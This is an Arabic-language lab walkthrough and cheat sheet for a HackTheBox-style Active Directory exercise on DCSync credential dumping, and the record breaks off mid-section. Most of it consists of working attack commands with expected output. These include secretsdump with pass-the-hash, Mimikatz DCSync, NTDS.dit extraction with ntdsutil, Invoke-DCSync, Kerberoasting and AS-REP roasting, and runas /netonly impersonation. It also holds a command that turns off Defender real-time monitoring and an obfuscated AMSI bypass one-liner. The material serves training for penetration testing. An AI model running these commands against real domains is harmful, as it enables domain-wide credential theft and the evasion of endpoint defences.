━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #3

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: أمر سحب بيانات يوزر واحد فقط باستخدام Impacket؟

✅ Back: نستخدم الـ flag المخصص:

`secretsdump.py -just-dc-user USERNAME domain/user@IP`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #4

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: شنو هو الـ Reversible Encryption؟

✅ Back: إعداد بالويندوز يخلي الباسورد ينخزن بتشفير RC4 بدل الهاش. بالـ DCSync، هذا الباسورد يطلع كنص صريح (Cleartext) بملف مخصص وما نحتاج نكسره.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #5

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: أمر استخراج الـ NTDS.dit محلياً (Offline) من داخل الـ DC نفسه؟

✅ Back: باستخدام الأداة المدمجة بالويندوز:

`ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #6

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: الأداة البديلة لـ secretsdump داخل بيئة الويندوز لعمل DCSync؟

✅ Back: أداة Mimikatz باستخدام الأمر:

`lsadump::dcsync /domain:domain.local /user:target_user`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #7

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ليش نستخدم `-outputfile` مع `secretsdump` للـ DCSync الكامل؟

✅ Back: لأن قاعدة البيانات (NTDS) ممكن تحتوي آلاف اليوزرات. طباعتها على الشاشة راح تضيع البيانات، الأفضل حفظها بملفات منفصلة للـ hashes والـ cleartext لتسهيل البحث (grep).

════════════════════════════════════════════

📄 ورقة الغش (Cheat Sheet) — للسكرين شوت

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📄 المخلص النهائي (DCSync & AD Credentials Cheat Sheet)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚔️ خوارزمية استخراج أسرار الدومين (Credential Dumping Flow):

١. حدد مستوى وصولك (Remote Linux vs Local Windows).

٢. تأكد من الصلاحيات (عندك Replication Rights؟ أو Local Admin؟).

٣. اختر الأداة (secretsdump للشبكة، ntdsutil للمحلي، Mimikatz للويندوز).

٤. نفذ الهجوم ووجه المخرجات لملف.

٥. حلل المخرجات: استخرج الـ Cleartext أولاً، ثم NTLM Hashes للـ Admins.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📐 جدول الأوامر الأساسية لعمليات DCSync و NTDS:

|**الهدف**|**الأداة**|**الأمر**|
|---|---|---|
|سحب كامل للـ DC عن بعد|secretsdump.py|`secretsdump.py -outputfile dump -just-dc DOMAIN/USER@DC_IP`|
|سحب هاش ليوزر محدد|secretsdump.py|`secretsdump.py -just-dc-user TARGET_USER DOMAIN/USER@DC_IP`|
|سحب باستخدام Pass-the-Hash|secretsdump.py|`secretsdump.py -hashes :NTLM_HASH -just-dc DOMAIN/USER@DC_IP`|
|تحليل NTDS محلي (Offline)|secretsdump.py|`secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL`|
|عمل DCSync من الويندوز|Mimikatz|`lsadump::dcsync /domain:domain.local /user:TARGET`|
|سحب كل الدومين بالويندوز|Mimikatz|`lsadump::dcsync /domain:domain.local /all /csv`|
|استخراج NTDS يدوياً (بالـ DC)|ntdsutil (CMD)|`ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q`|
|بحث عن يوزر بملفات السحب|grep (Linux)|`grep -i "username" dump.ntds`|
|عرض اليوزرات المكشوفة|cat (Linux)|`cat dump.ntds.cleartext`|

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔢 بنية سطر الـ Hash بملف الـ NTDS:

الصيغة الثابتة:

`Domain\Username:RID:LM_Hash:NTLM_Hash:::`

مثال توضيحي:

`htb\admin:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::`

- `htb\admin`: الدومين واسم المستخدم.
    
- `500`: الـ RID (رقم 500 يعني هو الـ Administrator الافتراضي).
    
- `aad3b...`: الـ LM Hash (تجاهله، رقم ثابت يعني فارغ).
    
- `88ad0...`: الـ NTLM Hash المطلوب للاستغلال أو التكسير.
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🚨 الفخوخ (لا تنساها):

❌ نسخ الـ LM Hash (اللي يبدأ بـ aad3) وتتخيله هو الباسورد المخفي.

❌ نسيان `-just-dc` مما يؤدي لسحب بيانات كثيرة ما إلها داعي وتأخير العملية.

❌ تنفيذ DCSync بدون تحديد يوزر (`-just-dc-user`) ببيئة حقيقية ضخمة (يسوي لود عالي على الـ DC وينبه الحماية).

❌ الاعتقاد بأن DCSync هجوم اختراق مباشر (Exploit). هو "إساءة استخدام" لبروتوكول شرعي ويحتاج صلاحيات مسبقة (Replication rights).

══════════════════════════════════════════════════════

🎯 رسالة الختام:

بهيج خلصنا. هسة عندك:

✅ القصة الكبيرة (ليش هالهجوم/التقنية موجودة، وشنو يعني Replication و Reversible Encryption)

✅ كل المصطلحات (DC, DCSync, NTLM Hash, NTDS.dit, secretsdump)

✅ كيفية التفكير (decision trees للتعامل مع سحب الباسوردات)

✅ الاستغلال التفصيلي (خطوة خطوة مع الأوامر شلون سحبنا الهاش وطلعنا الـ Cleartext)

✅ الـ bypasses والـ variations والفخوخ (شلون نستخدم Mimikatz أو نسحب محلي)

✅ فلاشكاردز (للمراجعة السريعة)

✅ ورقة الغش (سكرين شوت قبل الـ CTF أو الامتحان)

راجع الفلاشكاردز وورقة الغش قبل كل تحدي — وراح تجد الأنماط مألوفة. بالتوفيق! 💪




تمام! استلمت التحدي. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 المصطلحات → 🟡 تحليل التحدي → 🟠 الاستغلال → 🔴 ماذا لو → 💎 فلاشكاردز → 📄 ورقة غش

يله نبدأ...

════════════════════════════════════════════

🟢 المرحلة 0: ما قبل الصفر — Big Picture

════════════════════════════════════════════

تخيل وياي السيناريو التالي بحياتنا اليومية حتى تفهم الفكرة الأساسية مال هذا الجزء المتقدم من هجوم الـ DCSync.

تخيل إنك مهندس صيانة سيارات، وعندك صندوق أدوات (Toolbox) بيه درنفيس كهربائي يفتح أي برغي بثواني. هذا الدرنفيس هو أداة `secretsdump.py` اللي شفناها بالجزء الأول، واللي تشتغل من نظام لينكس وعبر الشبكة بكل سهولة. لكن، بيوم من الأيام رحت تصلح سيارة، واكتشفت إن البنيد (غطاء المحرك) مقفول وما تكدر تستخدم الدرنفيس الكهربائي مالتك. لازم تستخدم أدوات يدوية من داخل السيارة نفسها، أو ممكن تلقى نظام حماية (إنذار) يمنعك تستخدم أدواتك المعتادة.

بعالم الاختراق (Red Teaming) والـ Active Directory، الأشياء نادراً ما تمشي بشكل مثالي من أول مرة. مرات ما نكدر نوصل لحاسبة اللينكس (الـ Attack Host) مالتنا، أو الجدار الناري (Firewall) يمنعنا، أو برامج الحماية (Antivirus/Windows Defender) تلزم أدواتنا وتحذفها قبل لا نلحق نكتب حرف واحد.

هنا يجي دور "الخطة باء وجيم ودال" (Backup Plans). المخترق المحترف مو هو اللي حافظ أداة وحدة، المخترق المحترف هو اللي يفهم "الآلية" (Mechanism) ويكدر ينفذها بألف طريقة.

بهذا التحدي المتقدم، إحنا راح نتعلم شلون ننفذ نفس الهجوم (DCSync) بس من بيئة "معادية" أكثر، وهي بيئة الويندوز (Windows Environment). راح نضطر نتعامل وية حماية الويندوز، وراح نستخدم أدوات مخصصة للويندوز مثل `Mimikatz` (ملك استخراج الباسوردات)، وراح نتعلم شلون نستخدم الـ PowerShell كلغة برمجة قوية لاستخراج المعلومات بدلاً من بايثون.

أحد أهم المفاهيم اللي راح نغطيها هنا هو "فصل الهوية" (Identity Separation). بالويندوز، تكدر تكون مسجل دخول بحاسبتك كيوزر عادي (مثلاً طالب)، بس بنفس الوقت تفتح برنامج معين وتكوله: "من تريد تحجي وية الشبكة، استخدم هوية مدير النظام، بس ابقى كطالب داخل الحاسبة". هاي الميزة الخطيرة جداً بالويندوز (اللي تتنفذ عن طريق أداة runas مع خيار /netonly) تسمح للمخترق إنه يستخدم باسوردات مسروقة حتى يهاجم السيرفرات (DCs) بدون ما يحتاج يغير اليوزر مالته بالكامل أو يسوي تسجيل خروج.

أيضاً، راح نغوص أكثر بفهم الـ AD (Active Directory). الـ AD مو مجرد أسماء وباسوردات، هو عبارة عن قاعدة بيانات ضخمة بيها خصائص (Attributes) لكل يوزر. بعض هاي الخصائص مخفية على شكل أرقام (Bitmasks). راح نتعلم شلون نقرأ هاي الأرقام، ونستخرج منها معلومات ذهبية، مثل أن نعرف مسبقاً ياهو من اليوزرات مفعل عليه ميزة "التشفير القابل للعكس" (Reversible Encryption) قبل ما نسحب كل البيانات، وهذا يخلي هجومنا هادئ جداً ومحدد (Targeted) بدل ما نسوي ضوضاء بالشبكة.

شنو راح نتعلم بالنهاية من هذا التحدي؟

١. كيفية تنفيذ هجوم DCSync من داخل بيئة الويندوز باستخدام أداة `Mimikatz`.

٢. كيفية انتحال الشخصية عبر الشبكة باستخدام مفهوم `/netonly` المتقدم.

٣. الاستطلاع الدقيق (Enumeration) باستخدام أوامر PowerShell لمعرفة خصائص اليوزرات.

٤. كيفية التعامل مع برامج الحماية (AV/AMSI) وتخطيها للوصول للهدف.

٥. طرق بديلة وحلول للمشاكل الكارثية اللي ممكن تواجهنا أثناء استخراج الأسرار.

════════════════════════════════════════════

🔵 المرحلة 1: المصطلحات

════════════════════════════════════════════

حتى نكون على نفس الصفحة ونفهم الأوامر الجاية، لازم نشرح المصطلحات والأدوات اللي راح نستخدمها. اقرأها زين لأن هاي هي لغتنا هسه:

Mimikatz (ميميكاتز - ملك الأسرار)

- شنو يعني؟ أداة فرنسية أسطورية مكتوبة بلغة C، تعتبر الكابوس الأكبر لمايكروسوفت. الأداة تتلاعب بذاكرة الويندوز (خصيصاً عملية اسمها LSASS) حتى تستخرج الباسوردات، الهاشات، وتذاكر كيربروس. وتكدر تسوي هجوم DCSync بكل سهولة.
    
- وين يظهر بالأدوات؟ راح نفتحها من الـ CMD بكتابة `mimikatz.exe`، ونستخدم أوامرها الداخلية مثل `lsadump::dcsync`.
    

runas /netonly (التشغيل كـ... للشبكة فقط)

- شنو يعني؟ أمر مدمج بالويندوز يخليك تشغل برنامج (مثل PowerShell) بصلاحيات يوزر آخر. الـ flag السحري `/netonly` يكول للويندوز: "شوف، ابقى اتعامل وياي محلياً كـ يوزر عادي، بس إذا هذا البرنامج حاول يتصل بسيرفر ثاني بالشبكة، دز معلومات اليوزر الثاني (الـ Admin) مو مالتي".
    
- وين يظهر بالأدوات؟ نستخدمه حتى ننتحل شخصية اليوزر `adunn` اللي عنده صلاحيات DCSync، بدون ما نطلع من حسابنا الحالي.
    

PowerView (منظار الطاقة)

- شنو يعني؟ سكربت طويل ومشهور مكتوب بلغة PowerShell، جزء من حزمة اسمها PowerSploit. مخصص لاختراق واستطلاع الـ Active Directory. يسهل عليك سحب كميات هائلة من المعلومات بأوامر بسيطة بدل ما تكتب كود معقد.
    
- وين يظهر بالأدوات؟ نستدعيه بأمر `Import-Module PowerView.ps1` وبعدها نستخدم دوال مثل `Get-DomainUser`.
    

userAccountControl (UAC) attribute (سمة التحكم بحساب المستخدم)

- شنو يعني؟ هذا مو الـ UAC اللي يطلعلك نافذة "Yes/No" بالويندوز! هذا Attribute (خاصية) موجودة داخل قاعدة بيانات الـ AD لكل يوزر. قيمته عبارة عن رقم يمثل مجموعة إعدادات. مثلاً رقم 512 يعني الحساب طبيعي. رقم 640 يعني الحساب طبيعي + مسموح تخزين باسورد بتشفير قابل للعكس.
    
- وين يظهر؟ راح نفلتر اليوزرات بناءً على هذا الرقم حتى نلكى صيدنا الثمين.
    

Bitmask / Bitwise Operations (عمليات البتات / القناع)

- شنو يعني؟ طريقة لحفظ عدة إعدادات برقم واحد باستخدام النظام الثنائي (Binary). الويندوز يجمع أرقام مضاعفة (1, 2, 4, 8, 16... 128, 512). حتى نعرف إذا إعداد معين مفعل، نستخدم عملية رياضية اسمها `band` (Bitwise AND) وية الرقم اللي نبحث عنه (مثل 128).
    
- مثال بسيط: إذا رقم اليوزر 640، واحنا ندور على الإعداد رقم 128، النظام يسوي `640 band 128`. إذا النتيجة طلعت 128، يعني الإعداد موجود!
    

AMSI (Anti-Malware Scan Interface) (واجهة فحص البرامج الضارة)

- شنو يعني؟ عين الحماية مال الويندوز (Defender) المفتوحة على الـ PowerShell. أي سكربت خبيث تكتبه بالباور شيل (مثل Mimikatz أو PowerView)، الـ AMSI يلتقطه ويقراه قبل لا يتنفذ، وإذا شافه مشبوه، يوكفه فوراً.
    
- وين يظهر؟ لما تحاول تشغل أدوات وتطلعلك رسالة حمرة تكول "This script contains malicious content". نحتاج نسويله Bypass.
    

Invoke-DCSync (استدعاء مزامنة متحكم المجال)

- شنو يعني؟ دالة موجودة داخل حزمة PowerSploit/PowerView. تسوي نفس شغل `secretsdump` و `Mimikatz` بس باستخدام لغة PowerShell نقية وعن طريق مكتبات .NET. ميزتها إنها تشتغل من الذاكرة وممكن تتخطى بعض أنظمة الحماية اللي تركز بس على ملفات الـ exe.
    

PEK (Password Encryption Key) (مفتاح تشفير كلمات المرور)

- شنو يعني؟ المفتاح السري اللي يستخدمه الويندوز حتى يشفر الباسوردات بطريقة (Reversible Encryption). لمن نسحب الباسوردات، الأداة مالتنا لازم أول شي تسحب هذا المفتاح حتى تفك تشفير الباسورد وتطلعه إلك كنص صريح (Cleartext). مرات تصير مشاكل وما ينسحب فتطلع الملفات فارغة.
    

WinRM (Windows Remote Management) (إدارة ويندوز عن بعد)

- شنو يعني؟ بروتوكول ويندوز يسمح بالتحكم بالأجهزة عن بعد عبر منفذ 5985 أو 5986. يعتبر البديل الأقوى والأخف للـ RDP (السطح المكتب البعيد). نقدر نتصل بيه باستخدام أداة اسمها `evil-winrm`.
    

════════════════════════════════════════════

🟡 المرحلة 2: تحليل التحدي + كيف تفكر

════════════════════════════════════════════

📖 ترجمة السيناريو والمطلوب:

التحدي يطلب منا تحقيق نفس أهدافنا السابقة: نلقى اليوزر اللي عنده Reversible Encryption (Q1)، نطلع باسورده الواضح (Q2)، ونطلع الهاش مال `khartsfield` (Q3).

لكن، هاي المرة، إحنا راح نشتغل من بيئة ويندوز (MS01). ومقدمنا بالتحدي عدة طرق (Approaches) مختلفة تعتمد على استخدام `Mimikatz`، أو استطلاع PowerShell عميق، أو خصائص متقدمة بأداة `secretsdump.py`. وأخيراً، معطينا سيناريوهات "ماذا لو" (Troubleshooting) بحال واجهنا بلوكات.

🎯 المعطيات:

- إحنا داخل حاسبة ويندوز `MS01` بصلاحية يوزر عادي `htb-student`.
    
- اليوزر اللي عنده صلاحية DCSync هو `INLANEFREIGHT\adunn` (ونعرف باسورده).
    
- هدفنا الـ DC اللي الـ IP مالته `172.16.5.5`.
    
- أدوات الحماية (Defender/AMSI) ممكن تكون فعالة وتخرب شغلنا.
    

🧭 كيف تفكر؟ — خريطة العقل (Decision Tree) للهجوم من الويندوز:

إحنا داخل بيئة ويندوز ونريد نسحب الباسوردات. شلون نحدد مسارنا؟

├── هل نكدر ننزل ونشغل أدوات جاهزة (.exe) مثل Mimikatz؟

│ ├── نعم، الـ AV طافي → نستخدم `runas /netonly` وبعدين `Mimikatz` (Approach 3).

│ └── لا، الـ AV يمسحها فوراً → ننتقل للخيارات الـ "Fileless" (بدون ملفات).

├── هل الـ PowerShell مسموح نستخدم سكربتاته بدون منع؟

│ ├── نعم → نستخدم استطلاع PowerView (Approach 4) أو `Invoke-DCSync` (Approach 6).

│ └── لا، الـ AMSI يمنعنا → لازم نسوي AMSI Bypass بالبداية، أو نستسلم ونرجع للـ Linux.

└── هل هدفنا السرية (Stealth) لو نريد نسحب كل شي؟

├── السرية ومحددين يوزر معين → نسوي Enumeration بالأول حتى نعرف اليوزر، بعدين Targeted DCSync.

└── نريد معلومات ضخمة للتحليل (History & Status) → نستخدم `secretsdump` مع الـ Flags المتقدمة (Approach 5).

🗺️ خريطة الهجوم (Roadmap) اللي راح نمشي عليها هسه:

١. (Approach 3): راح نتعلم شلون نشغل `Mimikatz` نيابة عن اليوزر `adunn` ونسحب الهاش مباشرة.

٢. (Approach 4): راح نتعلم الفن الراقي بالاستطلاع.. نستخدم PowerShell حتى نفلتر اليوزرات ونطلع اللي عنده "تشفير عكسي" بدون ما نسوي ضوضاء.

٣. (Approach 5): راح نرجع لـ `secretsdump` بس نعطيها صلاحيات تسحب تاريخ الباسوردات وحالة الحسابات.

٤. (Approach 6): راح نستخدم PowerShell فقط لتنفيذ الهجوم.

٥. (The Masterclass): راح نطبق سيناريوهات حل المشاكل إذا صار أي بلوك أو خطأ بالاتصال.

كل مسار من هذني يعتبر مهارة مستقلة لازم تتقنها لأن بالواقع راح تتنقل بيناتها حسب الموقف.

يله، نفتح الـ Terminal ونبدأ الشغل الثقيل.

════════════════════════════════════════════

🟠 المرحلة 3: الاستغلال التفصيلي (خطوة خطوة)

════════════════════════════════════════════

هنا راح نطبق الـ Approaches واحد ورا الثاني. ركز على التكتيك والسبب ورا كل أمر.

هذا المخطط (ASCII Diagram) يوضح فكرة الـ `/netonly` اللي راح نستخدمها بالخطوة الجاية:

Plaintext

```
[MS01 - Your Windows PC]
       │
       ├─ Local Actions (Opening folders, running CMD) ──► Done as 'htb-student'
       │
       └─ Network Actions (Connecting to DC) ────────────► Done as 'adunn' (Injected Token)
                                                               │
                                                               └──► [DC - 172.16.5.5]
```

━━━━━━━━━━━━━━

🔥 المسار الأول (Approach 3): استخدام Mimikatz من الويندوز

━━━━━━━━━━━━━━

الخطوة ١: حقن الصلاحيات عبر الشبكة (Netonly)

📌 ليش نسوي هاي الخطوة؟

إحنا مسجلين دخول كطالب عادي. برنامج `Mimikatz` يحتاج يتصل بالـ DC ويسوي DCSync. الـ DC ما راح يقبل اتصالنا لأن الطالب ما عنده صلاحية. فراح نفتح نافذة PowerShell جديدة محقون بيها هوية اليوزر `adunn` للاتصالات الخارجية.

🔧 الأمر (بالـ CMD العادي):

DOS

```
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

(راح يطلب باسورد `adunn`، اكتبه ودوس انتر).

💡 ليش هذا الأمر/الخيار بالذات؟

`runas`: أداة لتشغيل البرامج كيوزر آخر.

`/netonly`: الخيار السحري! يكوله استخدم الصلاحية فقط للشبكة (Network operations).

`/user:INLANEFREIGHT\adunn`: الدومين واسم اليوزر الهدف.

`powershell`: البرنامج اللي نريد نفتحه بهاي الصلاحية.

📤 الـ Output المتوقع:

Plaintext

```
Enter the password for INLANEFREIGHT\adunn:
Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
```

✅ الخطوة التالية: هسه انفتحت نافذة PowerShell زرقاء جديدة. أي شي يخص الشبكة نكتبه بهاي النافذة، راح يتنفذ باسم `adunn`.

الخطوة ٢: تشغيل Mimikatz وتفعيل الـ Debug

📌 ليش نسوي هاي الخطوة؟

لازم نشغل الأداة ونعطيها أعلى مستوى من الصلاحيات بالذاكرة (Debug Privilege) حتى تكدر تقرأ وتتلاعب بالنظام بدون ما يمنعها الويندوز.

🔧 الأمر (بداخل نافذة الـ PowerShell الجديدة):

PowerShell

```
cd C:\Tools\
.\mimikatz.exe
privilege::debug
```

💡 ليش هذا الأمر/الخيار بالذات؟

`cd C:\Tools\`: نروح للمسار اللي بيه الأداة (حسب اللاب).

`.\mimikatz.exe`: تشغيل الأداة.

`privilege::debug`: أمر داخلي بميميكاتز يطلب من الويندوز صلاحية `SeDebugPrivilege` اللي تسمح للبرنامج بالتدخل بعمليات النظام الحساسة.

📤 الـ Output المتوقع:

Plaintext

```
mimikatz # privilege::debug
Privilege '20' OK
```

(إذا طلعلك `OK`، أنت بالسليم).

الخطوة ٣: تنفيذ هجوم DCSync لسحب هدف محدد

📌 ليش نسوي هاي الخطوة؟

بدل ما نسحب ملايين الباسوردات، راح نطلب من الـ DC ينطينا معلومات یوزر محدد فقط (khartsfield أو syncron) حتى نحل أسئلة التحدي.

🔧 الأمر:

PowerShell

```
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\khartsfield
```

💡 ليش هذا الأمر/الخيار بالذات؟

`lsadump::dcsync`: وحدة (Module) داخل ميميكاتز مخصصة لتنفيذ هذا الهجوم.

`/domain`: اسم الدومين اللي كاعد نهاجمه.

`/user`: اسم اليوزر اللي نريد نسحب الباسورد والهاش مالته.

📤 الـ Output المتوقع:

Plaintext

```
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server

Object RDN           : khartsfield
** SAM ACCOUNT **
SAM Username         : khartsfield
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-XXXX

Credentials:
  Hash NTLM: 4bb3b317845d0a2b5e22b874e9d7c16a
    ntlm- 0: 4bb3b317845d0a2b5e22b874e9d7c16a
    lm  - 0: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

✅ الاستنتاج: هنا حصلنا الـ NTLM Hash للجواب الثالث (Q3) مباشرة من الويندوز! وتكدر تعيد الأمر على يوزر `syncron` حتى تطلع الـ Cleartext مالته.

⏸️ Mini-check: هل الـ `privilege::debug` انطاك خطأ (ERROR)؟ إذا نعم، معناها أنت ما شغلت الـ CMD الأصلي كـ Administrator بالخطوة الأولى.

━━━━━━━━━━━━━━

🔥 المسار الثاني (Approach 4): الاستطلاع الهادئ (Enumeration)

━━━━━━━━━━━━━━

الخطوة ٤: البحث عن ضحايا التشفير العكسي بالـ PowerShell

📌 ليش نسوي هاي الخطوة؟

بالسؤال الأول (Q1)، يطلب منا نلقى يوزر عنده Reversible Encryption. لو استخدمنا `secretsdump` وسحبنا كل شي راح نلقاه بالصدفة. بس الاحتراف هو أن "تبحث" عن الهدف قبل ما تهاجمه. راح نفلتر قاعدة بيانات الـ AD.

🔧 الأمر (طريقة الـ Active Directory Module الرسمية):

PowerShell

```
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl,SamAccountName | Select-Object SamAccountName, UserAccountControl
```

💡 ليش هذا الأمر/الخيار بالذات؟

`Get-ADUser`: أمر يجيب يوزرات من الدومين.

`-Filter`: حتى ما يجيب كل اليوزرات، نفلترهم.

`userAccountControl -band 128`: هنا السحر! قيمة 128 بالبتات (Bits) تمثل إعداد التشفير العكسي. `-band` تفحص إذا هذا الرقم موجود بخصائص اليوزر.

`-Properties`: نكوله جيب هاي الخصائص وياك للنتيجة.

📤 الـ Output المتوقع:

Plaintext

```
SamAccountName  UserAccountControl
--------------  ------------------
proxyagent      640
syncron         640
```

✅ الاستنتاج: جاوبنا Q1! اليوزر الثاني هو `syncron`. (لاحظ رقم 640 = 512 للحساب الطبيعي + 128 للتشفير العكسي).

🔧 الأمر البديل (طريقة PowerView إذا الأوامر الرسمية مموجودة):

PowerShell

```
Import-Module C:\Tools\PowerView.ps1
Get-DomainUser -Identity * | Where-Object {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | Select-Object samaccountname, useraccountcontrol
```

نفس النتيجة بس أداة مختلفة، وتبين الكلمة الانجليزية الواضحة بدل الرقم 128.

━━━━━━━━━━━━━━

🔥 المسار الثالث (Approach 5): هجوم secretsdump العميق

━━━━━━━━━━━━━━

الخطوة ٥: سحب تاريخ الباسوردات والحالة

📌 ليش نسوي هاي الخطوة؟

بالواقع، المخترق يريد يعرف إذا اليوزر مغير باسورده قريباً (حتى لا يتعب بكسر هاش قديم)، ويريد باسورداته القديمة (لأن الناس تكرر باسورداتها وتغير بس أرقام بالنهاية Password123 -> Password124)، ويريد يعرف إذا الحساب مفعل لو مقفول.

🔧 الأمر (نرجع للينكس لهذي الخطوة):

Bash

```
secretsdump.py -outputfile deep_dump -just-dc -pwd-last-set -history -user-status INLANEFREIGHT/adunn@172.16.5.5
```

💡 ليش هذا الأمر/الخيار بالذات؟

`-pwd-last-set`: يعرض تاريخ آخر تغيير للباسورد.

`-history`: يستخرج الهاشات القديمة (مفيدة جداً للـ Password Reuse).

`-user-status`: يكتبلك (Enabled) أو (Disabled).

📤 الـ Output المتوقع:

Plaintext

```
inlanefreight.local\khartsfield:XXXX:aad3b435b51404eeaad3b435b51404ee:4bb3b317845d0a2b5e22b874e9d7c16a::: (pwdLastSet=10/27/2021) (status=Enabled)
inlanefreight.local\khartsfield_history0:XXXX:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXX:::
```

━━━━━━━━━━━━━━

🔥 المسار الرابع (Approach 6): الهجوم بـ PowerShell نقي

━━━━━━━━━━━━━━

الخطوة ٦: DCSync باستخدام Invoke-DCSync

📌 ليش نسوي هاي الخطوة؟

إذا `Mimikatz` مسحته الحماية، وما تكدر توصل للينكس، الحل تستخدم أداة `PowerView/PowerSploit` وتسوي الهجوم بالباور شيل.

🔧 الأمر (داخل نافذة الـ netonly اللي سويناها بالبداية):

PowerShell

```
Import-Module C:\Tools\PowerView.ps1
Invoke-DCSync -Users @("khartsfield","syncron") -Domain "INLANEFREIGHT.LOCAL"
```

💡 ليش هذا الأمر/الخيار بالذات؟

`Invoke-DCSync`: الدالة المسؤولة عن الهجوم.

`-Users`: نعطيه مصفوفة (Array) بأسماء اليوزرات اللي نريد هاشاتهم.

📤 الـ Output المتوقع:

Plaintext

```
Domain          : INLANEFREIGHT.LOCAL
SamAccountName  : khartsfield
PwdLastSet      : 10/27/2021 7:12:04 AM
Enabled         : TRUE
rc4_hmac_nt     : 4bb3b317845d0a2b5e22b874e9d7c16a
```

(لاحظ أن الهاش طلع باسم `rc4_hmac_nt`، وهو نفس الـ NTLM Hash).

📊 لحد هسة:

[x] نفذنا ההجوم من Mimikatz ✓

[x] استطلعنا خصائص اليوزرات (UAC) بـ PowerShell ✓

[x] استخرجنا التاريخ والـ Status ✓

[x] نفذنا DCSync Fileless ✓

📐 ملخص الإجابات / النتائج:

نفس الإجابات اللي حصلناها بالجزء الأول، لكن بتكتيكات وأسلحة مختلفة تماماً أثبتت كفاءتها ببيئة الويندوز!

════════════════════════════════════════════

🔴 المرحلة 4: ماذا لو تغير؟ (Variations + Bypasses + Traps)

(The "WHAT IF" Masterclass)

════════════════════════════════════════════

هنا يبين المخترق الحقيقي من الـ Script Kiddie. هاي أهم سيناريوهات الفشل وحلولها:

🔄 Variations محتملة (الماستر كلاس):

Variation 1: ماذا لو ضاع باسورد اليوزر adunn أو تم تغييره؟

إنت تعرف إن `adunn` عنده DCSync Rights، بس فقدت الباسورد مالته. شنو الحل؟

الحل: نستخدم تقنيات Roasting! نرجع كأي يوزر عادي بالدومين ونحاول نصيد `adunn` من جديد.

إذا كان حسابه مرتبط بخدمة (عنده SPN)، نسوي Kerberoasting ونسحب تذكرته ونكسرها:

Bash

```
GetUserSPNs.py INLANEFREIGHT/htb-student:'Academy_student_AD!'@172.16.5.5 -dc-ip 172.16.5.5 -request
```

وإذا كان حسابه ما يطلب مصادقة مسبقة (Pre-auth disabled)، نسوي AS-REP Roasting:

Bash

```
GetNPUsers.py INLANEFREIGHT/adunn -dc-ip 172.16.5.5 -no-pass
```

Variation 2: ماذا لو ملف `cleartext` طلع حجمه 0 بايت (فارغ)؟

يعني لقيت يوزر عنده تشفير عكسي (syncron) بس الأداة ما طلعت باسورده!

ليش يصير هيج؟ الأداة `secretsdump` تحتاج مفتاح فك التشفير (PEK) حتى ترجع الباسورد لأصله. مرات استخراج الـ PEK يفشل لو كنت تستخدم يوزر عنده صلاحيات DCSync فقط بس مو Domain Admin.

الحل:

أولاً، تأكد إن اليوزر فعلاً مغير باسورده "بعد" ما تفعلت ميزة التشفير العكسي عليه (لأن لو الباسورد قديم، راح يبقى مشفر NTLM عادي).

ثانياً، استخدم حساب أعلى (مثل Administrator) وية الهاش مالته واستخدم وضع الـ debug:

Bash

```
secretsdump.py -just-dc -hashes :88ad09182de639ccc6579eb0849751cf INLANEFREIGHT/administrator@172.16.5.5 -debug
```

Variation 3: ماذا لو شغلنا Mimikatz والـ Windows Defender مسحه فوراً؟

هذا الطبيعي بأي بيئة حديثة. الـ AV يكره ميميكاتز.

الحلول الممكنة:

A. إذا عندك صلاحيات أدمن محلي على `MS01`، طفي الـ Defender مؤقتاً:

PowerShell

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

B. استخدم Bypass لبرنامج AMSI بالـ PowerShell قبل ما تحمل أي سكربت خبيث (مثل PowerView أو Invoke-Mimikatz). هذا الـ Bypass المشفر يعمي الـ AMSI:

PowerShell

```
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

C. الأسهل: اهرب من الويندوز وارجع للينكس واستخدم `secretsdump` لأن הـ Defender ما يكدر يحمي الـ DC من استعلامات الشبكة الشرعية!

Variation 4: ماذا لو اتصال الـ RDP مقفول أو يصير بيه Timeout؟

